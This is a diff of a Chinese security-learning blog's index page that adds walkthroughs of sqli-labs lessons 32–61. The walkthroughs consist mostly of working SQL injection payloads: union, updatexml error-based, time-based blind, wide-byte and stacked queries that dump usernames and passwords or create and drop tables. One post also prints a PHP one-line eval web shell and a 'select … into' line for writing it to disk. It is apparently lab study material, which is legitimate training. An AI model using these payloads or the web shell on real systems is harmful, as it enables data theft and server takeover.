@@ -127,7 +127,7 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">25</span>
+          <span class="site-state-item-count">30</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
@@ -176,7 +176,7 @@
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2022/02/01/lesson-29/">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/02/08/lesson50/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
@@ -189,7 +189,471 @@
     </span>
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
-          <a href="/2022/02/01/lesson-29/" class="post-title-link" itemprop="url">lesson-29</a>
+          <a href="/2022/02/08/lesson50/" class="post-title-link" itemprop="url">lesson54_61</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2022-02-08 18:18:18" itemprop="dateCreated datePublished" datetime="2022-02-08T18:18:18+08:00">2022-02-08</time>
+    </span>
+      <span class="post-meta-item">
+        <span class="post-meta-item-icon">
+          <i class="far fa-calendar-check"></i>
+        </span>
+        <span class="post-meta-item-text">Edited on</span>
+        <time title="Modified: 2022-02-18 20:23:21" itemprop="dateModified" datetime="2022-02-18T20:23:21+08:00">2022-02-18</time>
+      </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/sql%E6%B3%A8%E5%85%A5/" itemprop="url" rel="index"><span itemprop="name">sql注入</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h1 id="lesson54"><a href="#lesson54" class="headerlink" title="lesson54"></a>lesson54</h1><p>一般的联合查询注入，但只有十次机会</p>
+<p>?id=1</p>
+<p><img src="https://s2.loli.net/2022/02/18/I8q1zRoJSOjFfXU.png" alt="QQ截图20220218184638.png"></p>
+<p>?id=1’ order by 3–+</p>
+<p><img src="https://s2.loli.net/2022/02/18/9xHlZKoG5D3qtaE.png" alt="QQ截图20220218184904.png"></p>
+<p>?id=1’ order by 4–+</p>
+<p><img src="https://s2.loli.net/2022/02/18/qNX9eOfsVoZvgc3.png" alt="QQ截图20220218185026.png"></p>
+<p>?id=-1’ union select 1,2,3–+</p>
+<p><img src="https://s2.loli.net/2022/02/18/3OcyfzZQ9Xgtb8C.png" alt="QQ截图20220218185205.png"></p>
+<p>?id=-1’ union select 1,2,database()–+</p>
+<p><img src="https://s2.loli.net/2022/02/18/wRpsKIhYciHz5WB.png" alt="QQ截图20220218185315.png"></p>
+<p>?id=-1’ union select 1,2,group_concat(table_name)from information_schema.tables where table_schema=database()–+</p>
+<p><img src="https://s2.loli.net/2022/02/18/w6FYqVcPNrBStCk.png" alt="QQ截图20220218192118.png"></p>
+<p>?id=-1’ union select 1,2,group_concat(column_name)from information_schema.columns where table_name=’t87qfwjwea’–+</p>
+<p><img src="https://s2.loli.net/2022/02/18/lQUgki1Z3PdKsOx.png" alt="QQ截图20220218191401.png"></p>
+<p>?id=-1’ union select 1,2,group_concat(concat_ws(0x7e,sessid,secret_X1KA))from challenge.t87qfwjwea–+</p>
+<p><img src="https://s2.loli.net/2022/02/18/9vaJbfgKRrhU2tA.png" alt="QQ截图20220218192008.png"></p>
+<p>唯一要说的就是这关如果注入超过十次，表名和字段就会变非常恶心</p>
+<h1 id="lesson55"><a href="#lesson55" class="headerlink" title="lesson55"></a>lesson55</h1><p>?id=-1) union select 1,2,database()–+</p>
+<p>?id=-1) union select 1,2,group_concat(table_name)from information_schema.tables where table_schema=database()–+</p>
+<p>?id=-1) union select 1,2,group_concat(column_name)from information_schema.columns where table_name=’7lyan613nt’–+</p>
+<p>?id=-1) union select 1,2,group_concat(concat_ws(0x7e,sessid,secret_W8HV))from challenges.7lyan613nt–+</p>
+<h1 id="lesson56"><a href="#lesson56" class="headerlink" title="lesson56"></a>lesson56</h1><p>?id=-1’) union select 1,2,database()–+</p>
+<p>?id=-1’) union select 1,2,group_concat(table_name)from information_schema.tables where table_schema=database()–+</p>
+<p>?id=-1’) union select 1,2,group_concat(column_name)from information_schema.columns where table_name=’lby5b1quon’–+</p>
+<p>?id=-1’) union select 1,2,group_concat(concat_ws(0x7e,sessid,secret_6JN1))from challenges.lby5b1quon–+</p>
+<h1 id="lesson-57"><a href="#lesson-57" class="headerlink" title="lesson 57"></a>lesson 57</h1><p>?id=-1” union select 1,2,database()–+</p>
+<p>?id=-1” union select 1,2,group_concat(table_name)from information_schema.tables where table_schema=database()–+</p>
+<p>?id=-1” union select 1,2,group_concat(column_name)from information_schema.columns where table_name=’2by8hxznwc’–+</p>
+<p>?id=-1” union select 1,2,group_concat(concat_ws(0x7e,sessid,secret_LXMN))from challenges.2by8hxznwc–+</p>
+<h1 id="lesson58"><a href="#lesson58" class="headerlink" title="lesson58"></a>lesson58</h1><p>?id=1’and updatexml(1,concat(0x7e,(select database()),0x7e),1)–+</p>
+<p>?id=1’and updatexml(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema=database()),0x7e),1)–+</p>
+<p>?id=1’and updatexml(1,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_name=’6kkc70flk9’),0x7e),1)–+</p>
+<p>?id=1’and updatexml(1,concat(0x7e,(select group_concat(concat_ws(0x7e,sessid,secret_JXDL))from challenges.6kkc70flk9),0x7e),1)–+</p>
+<h1 id="lesson59"><a href="#lesson59" class="headerlink" title="lesson59"></a>lesson59</h1><p>?id=1 and updatexml(1,concat(0x7e,(select database()),0x7e),1)–+</p>
+<p>?id=1 and updatexml(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema=database()),0x7e),1)–+</p>
+<p>?id=1 and updatexml(1,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_name=’062lvunx5i’),0x7e),1)–+</p>
+<p>?id=1 and updatexml(1,concat(0x7e,(select group_concat(concat_ws(0x7e,sessid,secret_2XKL))from challenges.062lvunx5i),0x7e),1)–+</p>
+<h1 id="lesson-60"><a href="#lesson-60" class="headerlink" title="lesson 60"></a>lesson 60</h1><p>?id=1”) and updatexml(1,concat(0x7e,(select database()),0x7e),1)–+</p>
+<p>?id=1”) and updatexml(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema=database()),0x7e),1)–+</p>
+<p>?id=1”) and updatexml(1,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_name=’qlbva5vmrz’),0x7e),1)–+</p>
+<p>?id=1”) and updatexml(1,concat(0x7e,(select group_concat(concat_ws(0x7e,sessid,secret_JCJO))from challenges.qlbva5vmrz),0x7e),1)–+</p>
+<h1 id="lesson-61"><a href="#lesson-61" class="headerlink" title="lesson 61"></a>lesson 61</h1><p>?id=1’)) and updatexml(1,concat(0x7e,(select database()),0x7e),1)–+</p>
+<p>?id=1’)) and updatexml(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema=database()),0x7e),1)–+</p>
+<p>?id=1”) and updatexml(1,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_name=’qlbva5vmrz’),0x7e),1)–+</p>
+<p>?id=1”) and updatexml(1,concat(0x7e,(select group_concat(concat_ws(0x7e,sessid,secret_JCJO))from challenges.qlbva5vmrz),0x7e),1)–+</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/02/04/lesson46/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="发福的小菜狗">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="wds">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2022/02/04/lesson46/" class="post-title-link" itemprop="url">lesson46_49</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2022-02-04 16:02:32" itemprop="dateCreated datePublished" datetime="2022-02-04T16:02:32+08:00">2022-02-04</time>
+    </span>
+      <span class="post-meta-item">
+        <span class="post-meta-item-icon">
+          <i class="far fa-calendar-check"></i>
+        </span>
+        <span class="post-meta-item-text">Edited on</span>
+        <time title="Modified: 2022-02-18 20:25:26" itemprop="dateModified" datetime="2022-02-18T20:25:26+08:00">2022-02-18</time>
+      </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/sql%E6%B3%A8%E5%85%A5/" itemprop="url" rel="index"><span itemprop="name">sql注入</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h1 id="补充知识"><a href="#补充知识" class="headerlink" title="补充知识"></a>补充知识</h1><p>在sql语句中，asc是指定按升序排列的，desc是按降序来排列的</p>
+<p>select * from users order by 1 desc;</p>
+<p>select * from users order by 1 asc;</p>
+<p>lines terminated by XXX     每一行以XXX为结尾</p>
+<h1 id="lesson46"><a href="#lesson46" class="headerlink" title="lesson46"></a>lesson46</h1><p>提示输入sort</p>
+<p>?sort=1</p>
+<p><img src="https://s2.loli.net/2022/02/16/sn9aZ3S5cfvIrH1.png" alt="QQ截图20220216163248.png"></p>
+<p>?sort=2</p>
+<p><img src="https://s2.loli.net/2022/02/16/qwOZI6SJFV1dBiX.png" alt="QQ截图20220216163356.png"></p>
+<p>发现sort 后面因该跟的是列数，1列就按1到14排序，2列就是a到z排序</p>
+<p>效果跟 order by 一样</p>
+<p>首先是用联合查询尝试，不行</p>
+<p>然后我们尝试报错注入</p>
+<p>?sort=3 and updatexml(1,concat(0x7e,(database())),1)–+</p>
+<p><img src="https://s2.loli.net/2022/02/16/OuF34ZWhzHXPQUE.png" alt="QQ截图20220216165840.png"></p>
+<p>?sort=3 and updatexml(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema=database())),1)–+</p>
+<p><img src="https://s2.loli.net/2022/02/16/UCebynZDLrsxGMO.png" alt="QQ截图20220216170022.png"></p>
+<p>?sort=3 and updatexml(1,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_name=0x7573657273)),1)–+</p>
+<p><img src="https://s2.loli.net/2022/02/16/dCjRKtSGMlIcrhi.png" alt="QQ截图20220216170202.png"></p>
+<p>?sort=3 and updatexml(1,concat(0x7e,(select group_concat(concat(0x7e,username,password))from security.users)),1)–+</p>
+<p><img src="https://s2.loli.net/2022/02/16/jypbm2rFS5c8aU3.png" alt="QQ截图20220216170356.png"></p>
+<p>方法二用时间（延迟）注入</p>
+<p>?sort=1 and if(left(database(),1)=’s’,sleep(3),1)–+</p>
+<p><img src="https://s2.loli.net/2022/02/16/MWC9BIljGZgcXpL.png" alt="QQ截图20220216171635.png"></p>
+<h1 id="lesson47"><a href="#lesson47" class="headerlink" title="lesson47"></a>lesson47</h1><p>lesson47与46做法一样</p>
+<p>就是数据包裹不同，lesson47是用单引号进行包裹的</p>
+<p>?sort=3 and updatexml(1,concat(0x7e,(database())),1)–+</p>
+<p>?sort=3 and updatexml(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema=database())),1)–+</p>
+<p>?sort=3 and updatexml(1,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_name=0x7573657273)),1)–+</p>
+<p>?sort=3 and updatexml(1,concat(0x7e,(select group_concat(concat(0x7e,username,password))from security.users)),1)–+</p>
+<h1 id="lesson48"><a href="#lesson48" class="headerlink" title="lesson48"></a>lesson48</h1><p>没有报错的回显所以不能用报错注入</p>
+<p>只能用时间(延迟)注入</p>
+<p>?sort=1 and if(left(database(),8)=’security’,sleep(2),1)–+</p>
+<p><img src="https://s2.loli.net/2022/02/16/g7LEVFOJdcShx28.png" alt="QQ截图20220216172801.png"></p>
+<h1 id="lesson49"><a href="#lesson49" class="headerlink" title="lesson49"></a>lesson49</h1><p>也没有报错回显，用时间注入</p>
+<p>?sort=1 and if(left(database(),8)=’security’,sleep(2),1)–+</p>
+<p>?sort=1 and if(substr((select table_name from information_schema.tables where table_schema=’security’ limit 0,1),1,1)=’e’,1,sleep(2))–+</p>
+<p>?sort=1 and if(substr((select column_name from information_schema.columns where table_name=’users’ limit 0,1),1,1)=’e’,1,sleep(2))–+</p>
+<p>?sort=1 and if(substr((select username from security.users limit 0,1),1,1)=’e’,1,sleep(2))–+</p>
+<p>?sort=1 and if(substr((select password from security.users limit 0,1),1,1)=’e’,1,sleep(2))–+</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/02/03/lesson42/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="发福的小菜狗">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="wds">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2022/02/03/lesson42/" class="post-title-link" itemprop="url">lesson42_45</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2022-02-03 17:17:07" itemprop="dateCreated datePublished" datetime="2022-02-03T17:17:07+08:00">2022-02-03</time>
+    </span>
+      <span class="post-meta-item">
+        <span class="post-meta-item-icon">
+          <i class="far fa-calendar-check"></i>
+        </span>
+        <span class="post-meta-item-text">Edited on</span>
+        <time title="Modified: 2022-02-18 20:25:37" itemprop="dateModified" datetime="2022-02-18T20:25:37+08:00">2022-02-18</time>
+      </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/sql%E6%B3%A8%E5%85%A5/" itemprop="url" rel="index"><span itemprop="name">sql注入</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h1 id="lesson42"><a href="#lesson42" class="headerlink" title="lesson42"></a>lesson42</h1><p>通过检测，username这里有对当引号进行转义。而password这里没有，所以尝试对password处进行注入</p>
+<p>在这里把type改为text就可以看到密码了</p>
+<p><img src="https://s2.loli.net/2022/02/16/tSMjbVdgnyReNrh.png" alt="QQ截图20220216152806.png"></p>
+<p>在password里面尝试堆叠注入</p>
+<p>数据包裹方式为单引号</p>
+<p>a’;create table wds5418 like users;#</p>
+<p>虽然显示报错但是我们成功的创建了表</p>
+<p>然后用</p>
+<p>a’;drop table wds5418;#</p>
+<p>来删除表</p>
+<h1 id="lesson43"><a href="#lesson43" class="headerlink" title="lesson43"></a>lesson43</h1><p>与lesson42相同只是对数据的包裹方式不同罢了，一模一样的堆叠注入</p>
+<p>a’);create table wds5418 like users;#</p>
+<p>a’);drop table wds5418;#</p>
+<h1 id="lesson44"><a href="#lesson44" class="headerlink" title="lesson44"></a>lesson44</h1><p>无回显信息的注入，注入的方法和42和43一样，payload和42一样</p>
+<p>a’;create table wds5418 like users;#</p>
+<p>a’;drop table wds5418;#</p>
+<h1 id="lesson45"><a href="#lesson45" class="headerlink" title="lesson45"></a>lesson45</h1><p>也无回显的错误信息，注入方式和44关和44一样数据包裹不一样</p>
+<p>a’);create table wds5418 like users;#</p>
+<p>a’);drop table wds5418;#</p>
+<h1 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h1><p>堆叠注入的题目是开放的，因为堆叠注入可以执行所以语句。</p>
+<p>网上还有师傅用堆叠注入写入一句话木马，由此可见宽字节的危害</p>
+<ol>
+<li>权限</li>
+<li>一句话木马</li>
+<li>select XX into XXX</li>
+<li>绝对路径</li>
+</ol>
+<?php @eval($_POST[wds5418]);?>
+
+<p>select ‘<?php @eval($_POST[wds5418]);?>‘ into ‘绝对路径’</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/02/02/lesson37/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="发福的小菜狗">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="wds">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2022/02/02/lesson37/" class="post-title-link" itemprop="url">lesson37_41</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2022-02-02 20:41:37" itemprop="dateCreated datePublished" datetime="2022-02-02T20:41:37+08:00">2022-02-02</time>
+    </span>
+      <span class="post-meta-item">
+        <span class="post-meta-item-icon">
+          <i class="far fa-calendar-check"></i>
+        </span>
+        <span class="post-meta-item-text">Edited on</span>
+        <time title="Modified: 2022-02-18 20:25:49" itemprop="dateModified" datetime="2022-02-18T20:25:49+08:00">2022-02-18</time>
+      </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/sql%E6%B3%A8%E5%85%A5/" itemprop="url" rel="index"><span itemprop="name">sql注入</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h1 id="lesson37"><a href="#lesson37" class="headerlink" title="lesson37"></a>lesson37</h1><p>与lesson34是同种类型的 <del>替身</del> 就是处理post内容，同时包含宽字节注入</p>
+<p>因为相同的payload和方法都能用所以我就重新打一遍</p>
+<p>�’ union select  1,database()#</p>
+<p>�’ union select  group_concat(table_name)from information_schema.tables where table_schema=database(),database()#</p>
+<p>�’ union select  1,group_concat(column_name)from information_schema.columns where table_name=0x7573657273#</p>
+<h1 id="堆叠注入（stacked-injection）"><a href="#堆叠注入（stacked-injection）" class="headerlink" title="堆叠注入（stacked injection）"></a>堆叠注入（stacked injection）</h1><p>内容参考 <a target="_blank" rel="noopener" href="https://blog.csdn.net/dyw_666666/article/details/83351889?utm_source=app&app_version=5.0.1&code=app_1562916241&uLinkId=usr1mkqgl919blen">mysql注入天书</a></p>
+<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>在sql中，分号（；）是用来表示一条sql语句的结束。</p>
+<p>用；连接两个句子可以让他们一起执行</p>
+<p>联合语句和它的区别就在于union 或者union all执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句。</p>
+<p>lesson38 其实用单引号包裹数据的联合注入就可以做</p>
+<p><img src="https://s2.loli.net/2022/02/15/6NIcSZq1v39HfAT.png" alt="QQ截图20220215155911.png"></p>
+<p>但是网络上很多教程都讲了堆叠注入，所以我也提一下</p>
+<p>堆叠注入,创一个库</p>
+<p>?id=-1;create table wds5418 like users ;–+ </p>
+<p><img src="https://s2.loli.net/2022/02/15/Wr8VOqluBMgPTIX.png" alt="QQ截图20220215160958.png"></p>
+<p>在mysql命令行里发现成功创了一个库，注入成功。</p>
+<p><img src="https://s2.loli.net/2022/02/15/vf8GrU1ze2CZFpA.png" alt="QQ截图20220215161259.png"></p>
+<h1 id="lesson39"><a href="#lesson39" class="headerlink" title="lesson39"></a>lesson39</h1><p>无对数据进行包裹的联合注入就可以注入</p>
+<p>?id=-1 union select 1,database(),group_concat(table_name)from information_schema.tables where table_schema=database()–+</p>
+<h1 id="lesson-40"><a href="#lesson-40" class="headerlink" title="lesson 40"></a>lesson 40</h1><p>没有报错的回显</p>
+<p>用联合注入查询就可以做，因为没有错误回显，所以要多次尝试出数据包裹方式</p>
+<p>然后就没有什么难度了</p>
+<p>?id=-1’) union select 1,2,database()–+</p>
+<p>?id=-1’) union select 1,2,group_concat(table_name)from information_schema.tables where table_schema=database()–+</p>
+<p>?id=-1’) union select 1,2,group_concat(column_name)from information_schema.columns where table_name=’usrs’–+</p>
+<p>?id=-1’) union select 1,2,group_concat(concat_ws(0x7e,username,password)) from security.users–+</p>
+<h1 id="lesson-41"><a href="#lesson-41" class="headerlink" title="lesson 41"></a>lesson 41</h1><p>同样没有报错的回显</p>
+<p>其实没啥难度，主要花时间的是猜它的包裹方式</p>
+<p>?id=-1 union select 1,2,database()–+</p>
+<p>?id=-1 union select 1,2,group_concat(table_name)from information_schema.tables where table_schema=database()–+</p>
+<p>?id=-1 union select 1,2,group_concat(column_name)from information_schema.columns where table_name=’users’–+</p>
+<p>?id=-1 union select 1,2,group_concat(concat_ws(0x7e,username,password)) from security.users–+</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/02/01/lesson29/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="发福的小菜狗">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="wds">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2022/02/01/lesson29/" class="post-title-link" itemprop="url">lesson29_31</a>
         </h2>
 
         <div class="post-meta-container">
@@ -207,7 +671,7 @@
           <i class="far fa-calendar-check"></i>
         </span>
         <span class="post-meta-item-text">Edited on</span>
-        <time title="Modified: 2022-02-13 16:15:45" itemprop="dateModified" datetime="2022-02-13T16:15:45+08:00">2022-02-13</time>
+        <time title="Modified: 2022-02-18 20:28:32" itemprop="dateModified" datetime="2022-02-18T20:28:32+08:00">2022-02-18</time>
       </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -287,6 +751,142 @@
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/02/01/lesson32/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="发福的小菜狗">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="wds">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2022/02/01/lesson32/" class="post-title-link" itemprop="url">lesson32_36</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2022-02-01 16:26:34" itemprop="dateCreated datePublished" datetime="2022-02-01T16:26:34+08:00">2022-02-01</time>
+    </span>
+      <span class="post-meta-item">
+        <span class="post-meta-item-icon">
+          <i class="far fa-calendar-check"></i>
+        </span>
+        <span class="post-meta-item-text">Edited on</span>
+        <time title="Modified: 2022-02-18 20:26:06" itemprop="dateModified" datetime="2022-02-18T20:26:06+08:00">2022-02-18</time>
+      </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/sql%E6%B3%A8%E5%85%A5/" itemprop="url" rel="index"><span itemprop="name">sql注入</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h1 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h1><p>宽字节：GB2312、GBK、GB18030、BIG5、shift_JIS等就是常说的宽字节，实际上只有两个字节。宽字节带来的安全问题主要是ascii字符（一字节）的现象，即将两个ASCII字符误认为一个宽字节字符。中文、韩文、日文等均存在宽字节，英文默认一个字节。</p>
+<p>在使用PHP连接MySQL的时候，当设置”set character set client + gbk”</p>
+<p>例子：id=1‘ 处理1&#39; 进行编码 1%5c%27     带入sql后进行id=&#39; and XXX此时无法完成注入</p>
+<p>​            id=1%df 处理1%df\进行编码1%df%5c%27  带入sql后id=1運’ andXXX此时存在宽字节注入漏洞</p>
+<h1 id="lesson-32"><a href="#lesson-32" class="headerlink" title="lesson 32"></a>lesson 32</h1><p>观察代码</p>
+<p><img src="https://s2.loli.net/2022/02/13/kKPURSOMbtgoqnL.png" alt="QQ截图20220213195156.png"></p>
+<p>这段代码的作用就是在我们输入的特殊符号单引号前面加上一个\，来转意</p>
+<p><img src="https://s2.loli.net/2022/02/13/reF8PB6OsKmxtQY.png" alt="QQ截图20220213195626.png"></p>
+<p>宽字节注入，就是把这个转意用的\，又转意成宽字节，使我们的注入成功</p>
+<p>在前面加上%81-%FE中可以成功转意的我们这里用%bb来举例</p>
+<p>用联合注入</p>
+<p>?id=-1%bb’union select 1,database(),group_concat(table_name)from information_schema.tables where table_schema=database()–+</p>
+<p><img src="https://s2.loli.net/2022/02/13/qfJkblINeBPhDOc.png" alt="QQ截图20220213200704.png"></p>
+<p>用字符转16进制</p>
+<p>?id=-1%bb’union select 1,database(),group_concat(column_name)from information_schema.columns where table_name=0x7573657273–+</p>
+<p><img src="https://s2.loli.net/2022/02/13/l7x5hP19vwikQGe.png" alt="QQ截图20220213202357.png"></p>
+<p>?id=-1%bb’union select 1,database(),group_concat(concat_ws(0x7e,username,password))from users–+</p>
+<h1 id="lesson-33"><a href="#lesson-33" class="headerlink" title="lesson 33"></a>lesson 33</h1><p>和lesson32差不多，应用了addslashes()函数——在双引号（预定符号）前加入反斜杠。payload也一样</p>
+<h1 id="lesson-34"><a href="#lesson-34" class="headerlink" title="lesson 34"></a>lesson 34</h1><p>很明显的是用post进行的传参，</p>
+<p><img src="https://s2.loli.net/2022/02/13/oLi7JbFMDvtAI5P.png" alt="QQ截图20220213221348.png"></p>
+<p>首先burpsuite抓包拦截一下数据</p>
+<p><img src="https://s2.loli.net/2022/02/13/gvKYQP7SGxHoMpO.png" alt="QQ截图20220213221313.png"></p>
+<p>所以username对于uname,password对应着passwd，还有一行submit</p>
+<p>首先对其进行单引号的包裹试探</p>
+<p><img src="https://s2.loli.net/2022/02/13/V5iFDaQsdzeTHXp.png" alt="QQ截图20220213224544.png"></p>
+<p>发现前面加上了\进行转义，于是乎套用宽字节注入，然而注入失败发现注入内容变成了一个之前从来没见过的符号</p>
+<p><img src="https://s2.loli.net/2022/02/13/tEg2CMsixqSBRpL.png" alt="QQ截图20220213224833.png"></p>
+<p>对其进行抓包来寻找问题的出处，这时发现我们的%被转意了</p>
+<p><img src="https://s2.loli.net/2022/02/13/c3sUDNmaQzt547V.png" alt="QQ截图20220213225106.png"></p>
+<p>于是直接对抓包内容进行修改（宽字节注入）</p>
+<p><img src="https://s2.loli.net/2022/02/13/Ys5dtQfEj9PF3Ig.png" alt="QQ截图20220213225311.png"></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span 